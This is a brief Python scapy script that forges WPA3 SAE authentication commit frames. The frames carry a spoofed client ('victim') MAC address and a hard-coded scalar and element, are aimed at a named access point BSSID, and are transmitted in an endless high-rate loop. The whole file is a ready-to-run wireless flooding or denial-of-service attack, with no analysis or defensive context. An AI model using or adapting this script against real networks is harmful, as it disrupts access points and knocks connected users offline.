from scapy.all import *
import time

def rand_mac():
  return '02:00:00:00:%02x:00'%(random.randint(0, 100))

bssid = "00:c0:ca:ad:b7:68"
victim = "ce:b4:26:d7:b9:98"
intf = sys.argv[1]
# dst = "02:00:00:00:00:09"
client = rand_mac()

pkt = RadioTap() / Dot11(subtype=0xb, type="Management", proto=0, addr1=bssid,
                                        addr2=victim,
                                        addr3=bssid) / Dot11Auth(algo=3, seqnum=1, status=0)
group = '\x13\x00'
scalar = '13405cf60063c3b399e8ff55f28c2f11148d1bb88d983f0039751330455985cd'
finite='1f7aa650c44e9ecbf2dd5c5c729ea2faf8ea08b6b918e7ee35119bb1422731a348b48150a04abe64f74ced36f810cfaf17aaf9008096119216578a7feecae4c1'
b_scalar = bytes.fromhex(scalar)
b_finite = bytes.fromhex(finite)
pkt = pkt / group / b_scalar / b_finite


while True:
  sendp(pkt, iface=intf, inter=0.0001, count=128, monitor=True)

